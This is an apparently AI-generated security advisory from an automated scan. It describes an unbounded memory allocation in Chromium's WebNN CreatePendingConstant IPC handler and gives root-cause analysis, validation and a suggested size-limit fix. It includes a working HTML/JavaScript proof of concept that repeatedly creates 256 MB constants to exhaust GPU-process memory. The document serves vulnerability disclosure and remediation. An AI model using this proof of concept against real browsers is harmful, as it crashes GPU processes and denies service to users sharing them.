# Security finding #640: CreatePendingConstant (line 2859) receives a mojo_base::BigBuffer `…

**Summary:** CreatePendingConstant (line 2859) receives a mojo_base::BigBuffer `…

**CWE IDs:** CWE-400: Uncontrolled Resource Consumption
**Severity / Impact:** Memory exhaustion DoS of the GPU process. A compromised renderer can send multiple CreatePendingConstant IPC calls, each with a multi-GB BigBuffer, causing the GPU process to allocate and copy that much memory per call. Since pending constants are only freed when the WebNNGraphBuilderImpl is destroyed (defaulted destructor at line 2857), the memory persists until the Mojo connection is disconnected. This can crash the GPU process (OOM) affecting all users sharing that process.
**Affected location:** `targets/chromium/services/webnn/webnn_graph_builder_impl.cc:2859` — `WebNNGraphBuilderImpl::CreatePendingConstant()`
**Validated for repos:** chromiumWebnn
**Trust boundary:** Mojo IPC from a compromised renderer process to the GPU process WebNNGraphBuilder interface

## Description / Root cause
CreatePendingConstant (line 2859) receives a mojo_base::BigBuffer `data` from the renderer and copies it into a WebNNPendingConstantOperand (line 2891) without checking that data.size() is within tensor_byte_length_limit or any reasonable bound. The only size validation is a multiplication overflow check (line 2878: CheckMul(data.size(), 8)) and a divisibility check (line 2881). The tensor_byte_length_limit check only happens later during CreateGraph→ValidateGraphImpl at line 3033, by which time the data has already been allocated and copied. A renderer can call CreatePendingConstant multiple times with large BigBuffers (which Mojo supports via shared memory) without ever calling CreateGraph, causing unbounded memory allocation in the GPU process.

**Validator analysis:** The flaw is real and reachable. CreatePendingConstant (webnn_graph_builder_impl.cc:2859-2899) receives a mojo_base::BigBuffer from a compromised renderer and copies it via base::HeapArray::CopiedFrom (webnn_pending_constant_operand.cc:17) into a member set (pending_constant_operands_, webnn_graph_builder_impl.h:126) with no upper-bound check on data.size(). The only validations are: has_built_ flag (line 2863, only blocks post-CreateGraph calls), zero-size check (line 2869), and a multiplication-overflow/divisibility check (lines 2878-2881). The tensor_byte_length_limit (line 3033) is enforced only inside ValidateGraphImpl, which is called from CreateGraph (line 2912) — a renderer can call CreatePendingConstant many times with unique tokens and multi-GB BigBuffers (Mojo shared memory) without ever calling CreateGraph, causing unbounded GPU-process heap allocation that persists until the Mojo pipe disconnects. CWE-400 is accurate; the impact (GPU process OOM DoS affecting all users on that process) is correct. The proposed fix (check data.size() against context_->properties().tensor_byte_length_limit before the copy, plus a per-builder cumulative limit) is correct and sufficient. The downstream repos (onnxruntime, openvinoEp, openvino) are not on this path — the flaw is entirely within the Chromium WebNN service's Mojo IPC handling before any graph is built or forwarded downstream.

## Exploit / Proof of Concept
A renderer creates a WebNN context and WebNNGraphBuilder, then calls CreatePendingConstant repeatedly (e.g., 100 times) with a ~1GB BigBuffer each (using unique WebNNPendingConstantToken handles). Each call passes the overflow check (1GB × 8 = 8GB bits, no overflow on 64-bit) and the divisibility check (size is a multiple of the data type's byte size). The GPU process allocates ~100GB total, exceeding physical memory, causing OOM. The renderer never calls CreateGraph, so the tensor_byte_length_limit check at line 3033 is never reached.

## Reproduction (html)
```
<!DOCTYPE html>
<html>
<head>
<title>WebNN CreatePendingConstant Memory Exhaustion PoC</title>
</head>
<body>
<h1>WebNN CreatePendingConstant Memory Exhaustion PoC</h1>
<p>This page demonstrates that MLGraphBuilder.createConstant() copies arbitrarily large buffers into the GPU process without a size bound.</p>
<pre id="log"></pre>
<script>
function log(msg) {
  document.getElementById('log').textContent += msg + '\n';
}

async function exploit() {
  if (!navigator.ml) {
    log('WebNN not available');
    return;
  }
  try {
    const context = await navigator.ml.createContext({deviceType: 'gpu'});
    const builder = new context.GraphBuilder();

    // Each createConstant() call triggers a CreatePendingConstant Mojo IPC.
    // Use a large buffer per call to amplify memory usage in the GPU process.
    // 256MB per call, 40 calls = ~10GB allocated in GPU process heap.
    const numCalls = 40;
    const bufferSize = 256 * 1024 * 1024; // 256 MB

    log('Starting ' + numCalls + ' createConstant() calls, each with ' +
        (bufferSize / 1024 / 1024) + ' MB...');

    for (let i = 0; i < numCalls; i++) {
      // Create a large ArrayBuffer and wrap it as a constant operand.
      // float32 data type (4 bytes per element).
      const data = new Float32Array(bufferSize / 4);
      // createConstant() sends data to the GPU process via CreatePendingConstant IPC.
      const operand = builder.constant('float32', data);
      log('Call ' + (i + 1) + ' done: created constant operand with ' +
          (bufferSize / 1024 / 1024) + ' MB');
    }

    log('All ' + numCalls + ' calls complete. GPU process has allocated ~' +
        (numCalls * bufferSize / 1024 / 1024 / 1024) + ' GB of pending constant data.');
    log('Note: We never call builder.build(), so tensor_byte_length_limit is never checked.');
    log('The pending constants persist until the page/context is destroyed.');
  } catch (e) {
    log('Error: ' + e.message);
  }
}

exploit();
</script>
</body>
</html>
```

## Test
_(not provided)_


## Suggested fix
Add a size check in CreatePendingConstant before copying the data, comparing data.size() against context_->properties().tensor_byte_length_limit. For example, after line 2874, add: `if (data.size() > context_->properties().tensor_byte_length_limit) { context_->ReportBadGraphBuilderMessage(kBadMessageInvalidPendingConstant, base::PassKey<WebNNGraphBuilderImpl>()); return; }`. Additionally, consider tracking total pending constant memory per builder and enforcing a per-builder limit.

## Models used

| Role | Provider / model |
| --- | --- |
| Idea | `claude-4-6-sonnet` |
| Tech lead | `openrouter,@preset/glm-5-2-no-reasoning` |
| Researcher | `openrouter,@preset/glm-5-2-no-reasoning` |
| Validator | `openrouter,@preset/glm-5-2-no-reasoning` |


---
_Filed by an automated security-scan harness; AI-generated — review before acting._ Finding #640.
